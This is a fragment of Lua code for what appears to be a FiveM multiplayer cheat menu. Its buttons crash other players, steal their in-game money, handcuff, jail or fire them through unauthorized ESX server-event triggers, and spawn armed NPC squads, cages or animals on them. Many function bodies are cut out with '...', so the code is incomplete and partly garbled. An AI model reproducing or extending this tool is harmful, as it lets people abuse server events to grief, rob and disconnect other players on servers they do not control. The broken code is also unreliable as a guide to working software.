					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif foriv.Button("Teleport To Player With Vehicle") then
										drawNotification(
                    ...
                    elseif foriv.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
					...
					elseif foriv.Button("~g~Give ~w~Money") then
                    ...
                    elseif foriv.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif foriv.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif foriv.MenuButton("ESX Options", "PlayerESXMenu") then
                    elseif foriv.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif foriv.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif foriv.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif foriv.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif foriv.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					...
					elseif foriv.Button('Clone Car') then
                    ClonePedVeh()
					elseif foriv.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    elseif foriv.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif foriv.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif foriv.Button("Spawn Flare On Player") then
                    ...
                    elseif foriv.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    foriv.Display()
                elseif foriv.IsMenuOpened("PlayerESXMenu") then
                    if foriv.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif foriv.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    foriv.Display()
                elseif foriv.IsMenuOpened("PlayerESXTriggerMenu") then
                    if foriv.Button("ESX Revive") then
                    ...
                    DoScreenFadeIn(800)
					elseif foriv.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif foriv.Button("ESX Give Money To Player From Your Wallet") then
                    ...
                    elseif foriv.Button("ESX Steal Money From Player") then
                    ...
                    elseif foriv.Button("ESX Handcuff Player") then
                        TriggerServerEvent("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif foriv.Button("ESX Send To Jail") then
                    ...
                    foriv.Display()
                elseif foriv.IsMenuOpened("PlayerESXJobMenu") then
                    if foriv.Button("Unemployed") then
                    ...
                    foriv.Display()
                elseif foriv.IsMenuOpened("PlayerTrollMenu") then
                    if foriv.Button ("Fake Chat Message") then
				...
				elseif foriv.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif foriv.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif foriv.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif foriv.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif foriv.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    elseif foriv.Button("Cage Player") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif foriv.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif foriv.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                ...
                elseif foriv.IsMenuOpened("SpawnPropsMenu") then
                    ...
                    then
                    elseif foriv.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif foriv.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif foriv.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif foriv.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    foriv.Display()
            elseif foriv.IsMenuOpened("VehicleRamMenu") then
                if foriv.Button("Futo") then
                ...
                elseif foriv.Button("Bus") then
                    ...
                    foriv.Display()
            elseif foriv.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if foriv.Button(allWeapons[i]) then
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("WeaponMenu") then
                if foriv.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
                elseif foriv.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif foriv.MenuButton("Weapon Customization", "WeaponCustomization") then
                elseif foriv.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                end

                foriv.Display()
            elseif foriv.IsMenuOpened("WeaponCustomization") then
                if foriv.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif foriv.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif foriv.Button("~g~Add Special Finish") then
                ...
                elseif foriv.Button("~r~Remove Special Finish") then
                ...
                elseif foriv.Button("~g~Add Suppressor") then
                ...
                elseif foriv.Button("~r~Remove Suppressor") then
                ...
                elseif foriv.Button("~g~Add Scope") then
                ...
                elseif foriv.Button("~r~Remove Scope") then
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("BulletGunMenu") then
                if foriv.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif foriv.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif foriv.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif foriv.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif foriv.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                foriv.Display()
            elseif foriv.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if foriv.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
